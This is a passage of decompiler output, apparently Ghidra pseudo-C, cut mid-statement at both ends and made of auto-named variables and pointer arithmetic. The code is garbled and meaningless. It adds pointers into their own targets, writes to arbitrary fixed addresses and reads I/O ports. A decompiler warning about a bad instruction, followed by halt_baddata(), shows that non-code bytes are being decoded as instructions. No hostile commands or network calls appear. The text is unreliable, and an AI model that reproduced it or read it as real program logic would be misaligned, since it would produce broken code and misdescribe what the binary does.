ppuVar93[-2];\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            uVar27 = iVar37 - 1;\n                            ppuVar93[-2] = ppuVar93 + -1;\n                            pcVar18 = (pcVar18 ^ uVar122) - 1;\n                            uVar38 = iVar23 - 3U & 0xffffff00 | iVar23 - 3U ^ *(iVar37 + 0x2f);\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *pcVar18 = *pcVar18 + uVar27;\n                            puVar94 = ppuVar93[-2];\n                            iVar23 = -*0x50222a76;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *puVar94 = uVar38;\n                            pcVar15[0x47] = pcVar15[0x47] ^ iVar115;\n                            uVar122 = pcVar15 & 0xffffff00;\n                            uVar6 = 9 < (uVar132 + 0x50 & 0xf) | uVar6;\n                            uVar7 = uVar132 + 0x50 + uVar6 * -6;\n                            uVar7 = uVar7 + (0x9f < uVar7 | 0xaf < uVar132 | uVar6 * (uVar7 < 6)) * -0x60;\n                            iVar95 = *puVar94;\n                            uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                            uVar7 = uVar7 + uVar6 * '\\x06';\n                            uVar132 = 0x90 < (uVar7 & 0xf0) | uVar27 < *(pcVar18 + iVar23) | uVar6 * (0xf9 < uVar7);\n                            uVar7 = uVar7 + uVar132 * '`';\n                            uVar17 = uVar38 + 1;\n                            *(iVar95 + 2) = iVar95 + 6;\n                            *(uVar122 | uVar7) = *(uVar122 | uVar7) + (iVar115 >> 8) + uVar132;\n                            uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                            uVar7 = uVar7 + uVar6 * -6;\n                            uVar7 = uVar7 + (0x9f < uVar7 | uVar6 * (uVar7 < 6)) * -0x60;\n                            pcVar15 = uVar122 | uVar7;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            *(iVar95 + -2) = iVar115;\n                            *(iVar95 + -6) = uVar27;\n                            pcVar15 = (uVar122 | uVar7) ^ 0x32483471;\n                            *(uVar38 + 0x56) = *(uVar38 + 0x56) ^ iVar115 - 1U;\n                            *(iVar95 + -10) = uVar118 - 1;\n                            *(iVar95 + -0xe) = puVar46;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(iVar95 + -0x12) = in_CS;\n                            cVar49 = uVar17;\n                            *(iVar37 + -2) = *(iVar37 + -2) - cVar49;\n                            puVar26 = *(iVar95 + -0x12);\n                            iVar96 = *(iVar95 + -0xe);\n                            pcVar15 = *(iVar96 + 4);\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(uVar38 + 0x5b) = *(uVar38 + 0x5b) + cVar49;\n                            uVar39 = *(iVar96 + 8);\n                            iVar37 = *(iVar96 + 0xc);\n                            uVar27 = pcVar18 + iVar23 + 1;\n                            *(iVar96 + 0xd) = uVar27;\n                            *puVar26 = *puVar26 ^ uVar27;\n                            uVar122 = iVar37 - 1;\n                            *(uVar38 + 0x36) = *(uVar38 + 0x36) & iVar115 + -2;\n                            uVar132 = *(iVar115 + -2);\n                            uVar7 = 9 < (uVar122 & 0xf) | 9 < (uVar39 & 0xf) | uVar6;\n                            uVar6 = uVar122 + uVar7 * -6;\n                            uVar38 = (uVar122 & 0xffffff00 | uVar6 + (0x9f < uVar6 | uVar7 * (uVar6 < 6)) * -0x60) &\n                                     0x2b4e29;\n                            uVar6 = *(uVar38 + 0x45 + uVar27);\n                            *(iVar96 + 9) = iVar96 + 0xd;\n                            *(iVar96 + 5) = (uVar17 & 0xffff0000 | CONCAT11(uVar17 >> 8 | uVar132, cVar49)) + 1;\n                            pcVar15 = iVar115 + -1;\n                            iVar23 = *(iVar96 + 9);\n                            *pcVar15 = *pcVar15 + iVar23;\n                            iVar115 = *(iVar96 + 0xd);\n                            iVar37 = *(iVar96 + 0x11);\n                            uVar17 = iVar23 + 1;\n                            piVar123 = iVar37 + 1;\n                            puVar36 = (((uVar122 >> 8 & 0x2b4e) << 8 | uVar38 ^ uVar6) - 1 ^ 0x45394641) + 0xc3c0dfdc;\n                            *puVar36 = *puVar36 + puVar36;\n                            *(iVar96 + 0x11) = iVar96 + 0x15;\n                            uVar38 = uVar17 & 0xffff0000 | CONCAT11(uVar17 >> 8 ^ *puVar46, uVar17);\n                            uVar122 = *(iVar96 + 0x15);\n                            uVar132 = uVar122 ^ *(iVar37 + 0x55 + uVar38 * 2);\n                            *puVar36 = *puVar36 + puVar36;\n                            pcVar18 = piVar123 + *piVar123;\n                            puVar16 = (uVar122 & 0xffffff00 | uVar132) + 0x77;\n                            *puVar16 = *puVar16 ^ uVar132;\n                            iVar23 = (uVar38 - 1 ^ *(pcVar18 + 0x39)) + 1;\n                            uVar6 = *puVar36;\n                            uVar122 = (puVar36 ^ 0x34763528) + 0xfc858ed7;\n                            uVar132 = in(iVar23);\n                            *puVar46 = uVar132;\n                            uVar8 = uVar122 + 'q' + ((puVar36 ^ 0x34763528) < 0x37a7129);\n                            uVar122 = uVar122 & 0xffffff00;\n                            uVar8 = uVar8 | *(uVar122 | uVar8);\n                            uVar38 = uVar122 | uVar8;\n                            *(iVar96 + 0x15) = iVar23;\n                            puVar26 = *(iVar96 + 0x15);\n                            uVar17 = (pcVar15 & 0xffffff00 | pcVar15 & uVar6) ^ *(uVar38 + 0x36);\n                            *(iVar96 + 0x19) = iVar115;\n                            uVar132 = *(uVar38 + 0x49);\n                            pcVar18[0x42] = pcVar18[0x42] ^ uVar8;\n                            piVar21 = *(iVar96 + 0x1a);\n                            pcVar15 = (uVar17 & 0xffffff00 | uVar17 ^ uVar132) * 2 + 0x200c3f3f;\n                            *pcVar15 = *pcVar15 + puVar26;\n                            iVar37 = *(iVar96 + 0x1e);\n                            *(iVar96 + 0x1e) = piVar21;\n                            puVar19 = iVar115 + 1U & *((uVar122 | uVar8 & 0xffffff70) + pcVar18 * 2);\n                            pcVar15 = *(iVar96 + 0x1e) & 0x4a3827;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(iVar37 + 0x39) = *(iVar37 + 0x39) + puVar26;\n                            *(iVar96 + 0x1e) = pcVar18;\n                            *(iVar96 + 0x1a) = pcVar15;\n                            piVar123 = pcVar15 ^ *(puVar26 * 3 + 0x35);\n                            *(iVar96 + 0x16) = piVar123;\n                            iVar23 = puVar26 + 1;\n                            *piVar123 = *piVar123 + piVar123;\n                            *(iVar31 + 0x38) = *(iVar31 + 0x38) + (piVar21 >> 8);\n                            *piVar123 = *piVar123 - (iVar96 + 0x16);\n                            piVar41 = piVar123 + 0x8d7cb89;\n                            if (0xdca0d1db < piVar123 || piVar41 == NULL) {\n                                uVar42 = *(iVar96 + 0x16);\n                                *(iVar96 + 0x16) = piVar41;\n                                *(iVar96 + 0x12) = iVar23;\n                                *(iVar96 + 0xe) = uVar42;\n                                *(iVar96 + 10) = iVar37 + -2;\n                                *(iVar96 + 6) = iVar96 + 0x1a;\n                                *(iVar96 + 2) = puVar19 + 1;\n                                *(iVar96 + -2) = pcVar18;\n                                *(iVar96 + -6) = iVar31 + 3;\n                                uVar39 = *(iVar31 + 3);\n                                *piVar41 = *piVar41 + piVar41;\n                                *piVar41 = *piVar41 + (uVar42 >> 8 & uVar39 >> 8);\n                                *(iVar96 + -10) = iVar23;\n                                *(iVar96 + -0xe) = iVar23;\n                                *(iVar96 + -0x12) = iVar96 + -0xe;\n                                *(iVar96 + -0x17) = iVar96 + -0x13;\n                                *puVar26 = *puVar26 ^ iVar31 + 2U;\n                                *(iVar96 + -0x1c) = pcVar18;\n                                *(iVar96 + -0x20) = piVar41;\n                                uVar132 = piVar41 ^ *piVar41;\n                                pcVar15 = piVar41 & 0xffffff00 | uVar132;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                *pcVar18 = *pcVar18 + iVar37 + -2;\n    // WARNING: Bad instruction - Truncating control flow here\n                                halt_baddata();\n                            }\n                            *(iVar96 + 0x12) = iVar23;\n                            pcVar15 = piVar41 ^ 0x4836494f;\n                            uVar122 = piVar21[0x13];\n                            *(iVar96 + 0xe) = pcVar15;\n                            uVar118 = (iVar37 - 1U ^ uVar122) - 1;\n                            *puVar19 = *puVar19 ^ piVar21;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(puVar19 + 0x2b) = *(puVar19 + 0x2b) + pcVar15;\n                            *(iVar96 + 10) = piVar21;\n                            *(puVar26 + 0x47) = *(puVar26 + 0x47) ^ uVar118;\n                            uVar122 = *(iVar96 + 10) | *(*(iVar96 + 10) + 0x3c);\n                            uVar132 = uVar122 + 0x3b;\n                            pcVar15 = uVar122 & 0xffffff00 | uVar132;\n                            *piVar21 = *piVar21 - (pcVar18 + -1);\n                            *pcVar15 = *pcVar15 + uVar132;\n                            uVar9 = uVar118;\n                            pcVar15[0x34] = pcVar15[0x34] + uVar9;\n                            puVar26 = pcVar18 + -2;\n                            *(iVar96 + 0xb) = puVar26;\n                            uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                            uVar11 = CONCAT11(((uVar122 & 0xffffff00) >> 8) + uVar7, uVar132 + uVar7 * '\\x06') & 0xff0f;\n                            uVar128 = *(iVar96 + 0xf);\n                            uVar132 = uVar11;\n                            uVar7 = 9 < uVar132 | uVar7;\n                            *puVar26 = *puVar26 & piVar21;\n                            puVar16 = (uVar122 & 0xffff0000 |\n                                      CONCAT11((uVar11 >> 8) - uVar7, uVar132 + uVar7 * -6) & 0xff0f) ^ 0x42;\n                            uVar27 = piVar21 | *puVar26;\n                            uVar8 = puVar16;\n                            *puVar16 = *puVar16 + uVar8;\n                            *puVar16 = *puVar16 + uVar8;\n                            *(iVar96 + 0xf) = iVar96 + 0x13;\n                            *(iVar96 + 0xb) = uVar27;\n                            *(iVar96 + 7) = puVar19;\n                            uVar17 = *(iVar96 + 7);\n                            uVar132 = puVar16[0x57];\n                            uVar122 = uVar17 & 0xffffff00;\n                            *puVar16 = *puVar16 + uVar8;\n                            uVar6 = *puVar16;\n                            *puVar16 = *puVar16 + uVar8;\n                            uVar10 = (puVar16 + CARRY1(uVar6, uVar8) + 0x152a4222) - 0x20;\n                            pcVar15 = puVar16 + CARRY1(uVar6, uVar8) + 0x152a4222 & 0xffffff00 | uVar10;\n                            *0x535c281f = *0x535c281f ^ uVar122 >> 8;\n                            *(iVar96 + 7) = in_CS;\n                            *pcVar15 = *pcVar15 + uVar10;\n                            piVar123 = uVar27 + 1;\n                            *(iVar96 + 7) = iVar96 + 0xb;\n                            *(iVar96 + 3) = uVar118;\n                            iVar23 = puVar19 + 1;\n                            pcVar15 = *(iVar96 + 2);\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            uVar129 = *(iVar96 + 6);\n                            puVar36 = iVar31 + 2;\n                            *(iVar96 + 6) = iVar96 + 10;\n                            *(iVar96 + 2) = iVar23;\n                            *(iVar96 + -2) = iVar23;\n                            uVar38 = (pcVar15 ^ 0x25053e0f) - 1;\n                            puVar16 = (uVar122 | uVar17 ^ uVar132) - 2;\n                            puVar97 = iVar96 + -5;\n                            *(iVar96 + -5) = puVar36;\n                            uVar7 = 9 < (uVar38 & 0xf) | uVar7;\n                            *puVar16 = *puVar16 + uVar9;\n                            if ((POPCOUNT(*puVar16) & 1U) == 0) {\n                                *(pcVar18 + 6) =\n                                     *(pcVar18 + 6) ^\n                                     (uVar38 & 0xffff0000 |\n                                     CONCAT11((uVar38 >> 8) + uVar7, uVar38 + uVar7 * '\\x06') & 0xff0f) ^ 0x544d50;\n                                *puVar26 = *puVar26 - (puVar16 >> 8);\n                                *(iVar96 + -9) = iVar96 + -5;\n                                *(iVar96 + -0xd) = iVar96 + -9;\n                                pcVar15 = *(iVar96 + -0xd);\n                                *puVar16 = *puVar16 ^ piVar123 >> 8;\n                                uVar132 = pcVar15;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                *(uVar27 + 0x34) = *(uVar27 + 0x34) + puVar16;\n                                uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                                uVar11 = CONCAT11((pcVar15 >> 8) + uVar7, uVar132 + uVar7 * '\\x06') & 0xff0f;\n                                puVar26 = pcVar15 & 0xffff0000 | uVar11;\n                                *(iVar96 + -0xd) = iVar96 + -9;\n                                puVar16 = puVar16 & 0xffffff00 | puVar16 ^ pcVar18[0x45];\n                                pcVar45 = uVar27 + 2;\n                                *puVar16 = *puVar16 ^ pcVar45 >> 8;\n                                *puVar16 = *puVar16 ^ uVar118 >> 8;\n                                uVar122 = *(iVar96 + -0xc);\n                                *puVar26 = *puVar26 ^ puVar26;\n                                *puVar26 = *puVar26 + uVar11;\n                                cVar49 = *pcVar45;\n                                cVar33 = uVar122;\n                                *pcVar45 = *pcVar45 + cVar33;\n                                if (SCARRY1(cVar49, cVar33) != *pcVar45 < '\\0') {\n                                    uVar132 = uVar11 ^ 0x22;\n                                    uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                                    puVar26 = pcVar15 & 0xffff0000 | uVar11 & 0xffffff00 | uVar132 + uVar7 * -6;\n                                }\n                                uVar7 = 9 < (puVar26 & 0xf) | uVar7;\n                                uVar38 = puVar26 & 0xffff0000 |\n                                         CONCAT11((puVar26 >> 8) - uVar7, puVar26 + uVar7 * -6) & 0xff0f | 0x343c3c22;\n                                uVar122 = uVar122 & 0xffff0000 | CONCAT11(uVar122 >> 8 & *puVar36, cVar33);\n                                uVar132 = uVar38;\n                                uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                                uVar132 = uVar132 + uVar7 * '\\x06';\n                                uVar132 = uVar132 + (0x90 < (uVar132 & 0xf0) | uVar7 * (0xf9 < uVar132)) * 'a';\n                                pcVar45 = uVar38 & 0xffffff00 | uVar132;\n                                *pcVar45 = *pcVar45 + uVar132;\n                                pcVar15 = uVar122 + 0x34;\n                                *pcVar15 = *pcVar15 + uVar9;\n                                *(iVar96 + -0xc) = uVar122 + 1;\n                                piVar123 = *(iVar96 + -0xc) + 1;\n                                *(iVar96 + -0xc) = piVar123;\n                                puVar16 = *(iVar96 + -0xc);\n                                *(iVar96 + -0xc) = iVar23;\n                                *(iVar96 + -0x10) = pcVar18 + -1;\n                                puVar26 = pcVar45 + -1;\n                                *(iVar96 + -0x14) = puVar26;\n                                puVar97 = iVar96 + -0x18;\n                                *(iVar96 + -0x18) = iVar23;\n                                uVar132 = puVar26;\n                                *puVar26 = *puVar26 + uVar132;\n                                *puVar26 = *puVar26 + uVar132;\n                                puVar36 = puVar36 | *puVar26;\n                                pcVar18[0x5b] = pcVar18[0x5b] ^ uVar9;\n                                puVar26 = pcVar18 + *piVar123;\n                                uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                            }\n                            else {\n                                *(puVar26 + uVar118) = *(puVar26 + uVar118) & puVar26;\n                            }\n                            uVar122 = *puVar97;\n                            *puVar97 = uVar122;\n                            puVar97[-1] = iVar23;\n                            puVar46 = puVar26 + 1;\n                            pcVar18 = (piVar123 & 0xffff0000 | CONCAT11(piVar123 >> 8 ^ *puVar36, piVar123)) - 1;\n                            *(puVar97 + -9) = puVar46;\n                            *(puVar97 + -0xd) = puVar16;\n                            uVar7 = 9 < (uVar122 & 0xf) | uVar7;\n                            uVar11 = CONCAT11((uVar122 >> 8) + uVar7, uVar122 + uVar7 * '\\x06') & 0xff0f;\n                            uVar132 = uVar11;\n                            *pcVar18 = *pcVar18 + uVar132;\n                            puVar16 = *(puVar97 + -0xd);\n                            *(puVar46 + uVar118) = *(puVar46 + uVar118) & puVar46;\n                            uVar7 = 9 < uVar132 | uVar7;\n                            uVar132 = uVar132 + uVar7 * '\\x06';\n                            uVar132 = uVar132 + (0x90 < (uVar132 & 0xf0) | uVar7 * (0xf9 < uVar132)) * '`';\n                            pcVar15 = uVar122 & 0xffff0000 | uVar11 & 0xffffff00 | uVar132;\n                            *puVar16 = *puVar16 ^ uVar11 >> 8;\n                            puVar16[0x35] = puVar16[0x35] + uVar132;\n                            *(puVar97 + -0xd) = pcVar18;\n                            *(puVar97 + -0x11) = puVar16 + -1;\n                            puVar36 = puVar36 + -1;\n                            puVar16 = puVar16 + -3;\n                            *(puVar97 + -0x15) = puVar97 + -0x11;\n                            puVar114 = puVar97 + -0x15;\n                            if (SBORROW1(*pcVar15, uVar132)) {\n                                *(puVar97 + -0x19) = pcVar15;\n                                *(puVar97 + -0x1d) = puVar26;\n                                *(puVar97 + -0x21) = puVar16;\n                                puVar19 = pcVar15 + -0x150727;\n                                *puVar16 = *puVar16 + puVar19;\n                                *puVar19 = *puVar19 & puVar26;\n                                puVar36 = *(puVar97 + -0x21);\n                                puVar26 = *(puVar97 + -0x1d);\n                                iVar23 = *(puVar97 + -0x19);\n                                uVar118 = *(puVar97 + -0x11);\n                                puVar16 = *(puVar97 + -9);\n                                pcVar15 = *(puVar97 + -5);\n                                *(puVar97 + -5) = puVar36;\n                                *(puVar97 + -9) = pcVar15;\n                                puVar114 = puVar97 + -9;\n                            }\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            puVar28 = *(puVar114 + 2);\n                            puVar19 = pcVar15 ^ *(uVar118 + 0x57);\n                            puVar98 = puVar114 + 2;\n                            *(puVar114 + 2) = puVar16 + -1;\n                            uVar38 = puVar26 + 1 ^ *puVar28;\n                            uVar122 = puVar16 + -1 ^ *puVar19;\n                            uVar132 = *puVar19;\n                            uVar6 = puVar19;\n                            *puVar19 = *puVar19 + uVar6;\n                            if (CARRY1(uVar132, uVar6) || *puVar19 == 0) {\n                                uVar7 = 9 < (uVar6 & 0xf) | uVar7;\n                                *(puVar36 + 0x25) = *(puVar36 + 0x25) | uVar38;\n                                iVar37 = *(puVar114 + 2);\n                                *(puVar114 + 2) = uVar118;\n                                uVar7 = 9 < (uVar6 + uVar7 * -6 & 0xf) | uVar7;\n                                uVar118 = uVar118 & *(puVar114 + 2 + puVar36);\n                                puVar26 = iVar37 + 0x2c5c462c;\n                                *puVar26 = *puVar26 & puVar114 + 2;\n                                *(uVar118 + 0x4b) = *(uVar118 + 0x4b) ^ iVar37;\n                                *(uVar122 + 0x36) = *(uVar122 + 0x36) ^ uVar122 + 1;\n                                *(uVar38 + 0x4f) = *(uVar38 + 0x4f);\n                                puVar28 = *(puVar114 + 2);\n                                uVar38 = uVar38 - 1;\n                                puVar99 = puVar114 + 10;\n                                puVar98 = puVar114 + 10;\n                                iVar23 = iVar23 + -1;\n                                pcVar15 = (*(puVar114 + 6) ^ 0x39) - 1;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                if (*pcVar15 != '\\0') {\n                                    puVar19 = pcVar15 & 0xffffff00;\n                                    (puVar114 + 0x45)[puVar36] = (puVar114 + 0x45)[puVar36] & puVar19 >> 8;\n                                    goto code_r0x00442ba3;\n                                }\n                            }\n                            else {\ncode_r0x00442ba3:\n                                pcVar15 = ((puVar19 & 0xffffff19 ^ 0x1e) & 0xffffff22) - 0x244833;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                pcVar18 = uVar122 + 0x51 + puVar28 * 2;\n                                *pcVar18 = *pcVar18 + pcVar15;\n                                puVar99 = puVar98 + -4;\n                                *(puVar98 + -4) = pcVar15;\n                            }\n                            puVar26 = uVar118 + 1;\n                            puVar16 = (uVar122 & 0xffffff00 | uVar122 ^ *(uVar122 + 0x4d)) + 1;\n                            uVar39 = *puVar99;\n                            uVar132 = pcVar15 ^ *puVar16;\n                            piVar123 = pcVar15 & 0xffffff00 | uVar132;\n                            *piVar123 = *piVar123 + uVar132;\n                            *puVar26 = *puVar26 + puVar16;\n                            iVar37 = *piVar123;\n                            *puVar26 = *puVar26 & puVar99 + 1;\n                            uVar122 = pcVar15 & 0xffffff00 | uVar132 + 0x15;\n                            pcVar15 = (puVar16 & 0xffffff00 | puVar16 & *0x42000000) - 1;\n                            *(puVar99 + 1) = uVar122;\n                            puVar26 = uVar122 ^ 0x51593435;\n                            uVar29 = iVar23 + 2;\n                            cVar49 = puVar26;\n                            *puVar26 = *puVar26 + cVar49;\n                            *(puVar26 + 0x27) = *(puVar26 + 0x27) + (uVar39 >> 8);\n                            puVar99[-1] = uVar29;\n                            *pcVar15 = *pcVar15 - (pcVar15 >> 8);\n                            *puVar26 = *puVar26 & puVar26;\n                            puVar99[-2] = uVar29;\n                            *0x36443100 = *0x36443100 ^ uVar29;\n                            iVar115 = puVar99[-2];\n                            puVar99[-2] = iVar115;\n                            piVar41 = uVar118 + 2;\n                            puVar99[-3] = uVar38 - iVar37;\n                            *(iVar115 + 0x46) = *(iVar115 + 0x46) ^ iVar115;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            puVar19 = puVar99[-3];\n                            uVar127 = puVar36 + -1 & *puVar19;\n                            pcVar15 = (puVar26 & 0xffffff00 | cVar49 - 0x29) & 0x39465803;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(puVar99 + -0xe) = puVar19;\n                            *(puVar99 + -0x12) = pcVar15;\n                            uVar122 = *(puVar99 + -0x12);\n                            uVar132 = uVar122;\n                            uVar17 = uVar122 & 0xffff0000;\n                            uVar122 = CONCAT11(uVar122 >> 8 & *(uVar118 + 0x2f), uVar132);\n                            pcVar15 = uVar17 | uVar122;\n                            *(puVar99 + -0x12) = uVar127;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            uVar27 = *(puVar99 + -0x12);\n                            iVar115 = *(puVar99 + -0xe);\n                            uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                            uVar11 = CONCAT11((uVar122 >> 8) + uVar7, uVar132 + uVar7 * '\\x06') & 0xff0f;\n                            *(puVar99 + -0xe) = iVar115 + 1;\n                            *(puVar99 + -0x12) = piVar41;\n                            *0x1d212c43 = *0x1d212c43 + iVar115 + 1;\n                            uVar122 = *(uVar127 + 1);\n                            *(puVar99 + -0x16) = uVar29;\n                            uVar38 = (uVar38 - iVar37) + 1 & uVar122 & *(uVar127 + 1 + (uVar17 | uVar11) * 2);\n                            *piVar41 = *piVar41 - (piVar41 >> 8);\n                            uVar7 = 9 < uVar11 | uVar7;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar7, uVar11 + uVar7 * '\\x06') & 0xff0f;\n                            pcVar15 = uVar17 | uVar11;\n                            cVar49 = uVar11;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            iVar37 = *(puVar99 + -0x16);\n                            iVar23 = iVar23 + 1;\n                            *(puVar99 + -0x16) = uVar27 ^ *(uVar27 + 0x4f);\n                            uVar122 = *(puVar99 + -0x16);\n                            pcVar45 = uVar127 + 2;\n                            puVar16 = uVar122 ^ 0x4c;\n                            *(puVar99 + -0x16) = puVar99 + -0x12;\n                            *(puVar99 + -0x1a) = pcVar45;\n                            pcVar18 = *(puVar99 + -0x1a);\n                            uVar6 = puVar16;\n                            *puVar16 = *puVar16 + uVar6;\n                            uVar132 = *puVar16;\n                            *puVar16 = *puVar16 + uVar6;\n                            piVar123 = iVar37 + puVar16 * 2;\n                            *piVar123 = puVar99 + CARRY1(uVar132, uVar6) + *piVar123 + -0x16;\n                            puVar26 = uVar38 + 3;\n                            pcVar15 = (uVar122 & 0xffffff00 | uVar6 + 0x31) - 0x143538;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(uVar38 + 0x44) = *(uVar38 + 0x44) + iVar37;\n                            puVar16 = *(puVar99 + -0x16);\n                            *(puVar99 + -0x16) = pcVar45;\n                            *(puVar99 + -0x1a) = puVar16;\n                            *(puVar99 + -0x1e) = pcVar18;\n                            *(puVar99 + -0x23) = iVar23;\n                            uVar6 = puVar16;\n                            *puVar16 = *puVar16 + uVar6;\n                            uVar132 = *puVar16;\n                            *puVar16 = *puVar16 + uVar6;\n                            iVar115 = iVar23 + *piVar41 + CARRY1(uVar132, uVar6);\n                            ppuVar113 = puVar99 + -0x23;\n                            if (SCARRY4(iVar23, *piVar41) != SCARRY4(iVar23 + *piVar41, CARRY1(uVar132, uVar6))) {\n                                puVar16 = *(puVar99 + -0x23);\n                                *(puVar99 + -0x23) = uVar128;\n                                *(puVar99 + -0x27) = puVar99 + -0x23;\n                                pcVar15 = *(puVar99 + -0x27);\n                                *(pcVar15 + 0x73) = *(pcVar15 + 0x73) & iVar37 + 1U;\n                                cVar49 = pcVar15;\n                                *pcVar15 = *pcVar15 + cVar49;\n                                pcVar18[0x4e] = pcVar18[0x4e] + cVar49;\n                                uVar27 = *(puVar99 + -0x23);\n                                piVar41 = uVar118 + 1;\n                                uVar132 = pcVar15 >> 8;\n                                uVar17 = (pcVar15 & 0xffff0000 | CONCAT11(uVar132 + *puVar16, cVar49) ^ 0x36) + 1;\n                                uVar7 = 9 < (uVar17 & 0xf) | uVar7;\n                                uVar6 = uVar17 + uVar7 * '\\x06';\n                                uVar132 = uVar6 + (0x90 < (uVar6 & 0xf0) |\n                                                  CARRY1(uVar132, *puVar16) | uVar7 * (0xf9 < uVar6)) * '`' ^ *puVar16;\n                                uVar122 = uVar17 & 0xffffff00 | uVar132;\n                                *(puVar99 + -0x23) = uVar122;\n                                uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                                uVar132 = uVar132 + uVar7 * '\\x06';\n                                uVar132 = uVar132 + (0x90 < (uVar132 & 0xf0) |\n                                                    uVar122 < 0x1f213a20 | uVar7 * (0xf9 < uVar132)) * '`';\n                                puVar16 = segment(uVar129, piVar41 + puVar26);\n                                uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                                uVar132 = uVar132 + uVar7 * '\\x06';\n                                uVar132 = uVar132 + (0x90 < (uVar132 & 0xf0) |\n                                                    *puVar16 < uVar27 >> 8 | uVar7 * (0xf9 < uVar132)) * '`';\n                                pcVar15 = uVar17 & 0xffffff00 | uVar132;\n                                pcVar45 = *(puVar99 + -0x23);\n                                *puVar26 = *puVar26 ^ uVar27;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                pcVar18 = uVar27 + 1;\n                                *(puVar99 + -0x23) = iVar115;\n                                iVar115 = iVar115 + 1;\n                                puVar16 = *(puVar99 + -0x23);\n                                ppuVar113 = puVar99 + -0x1f;\n                            }\n                            pcVar15 = puVar16 + -1 ^ 0x4c;\n                            uVar17 = *ppuVar113;\n                            *(uVar38 + 0x51) = *(uVar38 + 0x51) ^ uVar17;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            uVar122 = (puVar16 + -1 & 0xffffff00 | pcVar15 & 0xff) ^ 0x2b;\n                            uVar130 = *(ppuVar113 + 1);\n                            puVar36 = uVar122 & 0x53003d5d;\n                            ppuVar113[1] = ppuVar113 + 2;\n                            *ppuVar113 = puVar36;\n                            ppuVar113[-1] = pcVar18;\n                            *pcVar45 = *pcVar45 + (puVar36 >> 8);\n                            *0x255d2e2a = *0x255d2e2a & uVar17 >> 8;\n                            iVar37 = ppuVar113[-1];\n                            uVar132 = *puVar36;\n                            ppuVar113[-1] = iVar37 + 1;\n                            uVar38 = iVar37 + 2;\n                            *(iVar115 + 0x51) = *(iVar115 + 0x51) ^ uVar38;\n                            ppuVar113[-2] = uVar38;\n                            *pcVar18 = *pcVar18 + (uVar38 >> 8);\n                            iVar23 = ppuVar113[-2];\n                            uVar38 = iVar37 + 3;\n                            puVar26 = piVar41 + -2;\n                            iVar37 = iVar23 + 1;\n                            *(ppuVar113 + -9) = puVar26;\n                            *(ppuVar113 + -0xd) = puVar26;\n                            iVar115 = *(ppuVar113 + -0xd);\n                            ppuVar100 = *(iVar23 + 0x69) * 0x50;\n                            puVar16 = puVar26 + iVar37 * 2;\n                            uVar8 = uVar38 >> 8;\n                            *puVar16 = *puVar16 + uVar8;\n                            uVar132 = *((uVar122 & 0x10000100 | puVar36 & uVar132) ^ 0x23470054);\n                            uVar122 = *ppuVar100;\n                            *ppuVar100 = puVar26;\n                            pcVar48 = iVar115 + 1;\n                            uVar6 = uVar122 ^ 0x52;\n                            pcVar18 = (uVar38 & 0xffff0000 | CONCAT11(uVar8 ^ uVar132, uVar38)) - 1;\n                            *pcVar48 = *pcVar48 + iVar37;\n                            ppuVar101 = ppuVar100 + -1;\n                            ppuVar100[-1] = pcVar48;\n                            uVar7 = 9 < (uVar6 & 0xf) | uVar7;\n                            pcVar15 = uVar122 & 0xffff0000 |\n                                      CONCAT11((uVar122 >> 8) + uVar7, uVar6 + uVar7 * '\\x06') & 0xff0f;\n                            *(pcVar45 + 0x26) = in_XMM3;\n                            cVar49 = pcVar18 >> 8;\n                            uVar122 = CONCAT11(cVar49 - *pcVar18, pcVar18);\n                            puVar19 = pcVar18 & 0xffff0000 | uVar122;\n                            if (SBORROW1(cVar49, *pcVar18)) {\n                                *puVar19 = *puVar19 ^ ppuVar100 + -1;\n                                uVar132 = *(puVar19 + 0xe);\n                                iVar31 = ppuVar100[-1];\n                                pcVar15 = pcVar15 + -0x155e;\n                                *(iVar23 + 0x34) = *(iVar23 + 0x34) + iVar37;\n                                puVar26 = iVar31 + 1;\n                                iVar37 = *ppuVar100;\n                                pcVar48 = iVar115 + 2;\n                                puVar19 = (pcVar18 & 0xffff0000 | uVar122 & 0xffffff00 | pcVar18 & uVar132) ^\n                                          *(iVar31 + 0x48);\n                                *ppuVar100 = pcVar45;\n                                ppuVar100[-1] = pcVar15;\n                                uVar132 = pcVar15 ^ *(puVar19 + 0xc);\n                                pcVar15 = pcVar15 & 0xffffff00 | uVar132;\n                                ppuVar101 = ppuVar100 + -2;\n                                ppuVar100[-2] = ppuVar100 + -1;\n                                *pcVar15 = *pcVar15 + uVar132;\n                            }\n                            cVar33 = puVar26;\n                            *pcVar45 = *pcVar45 + 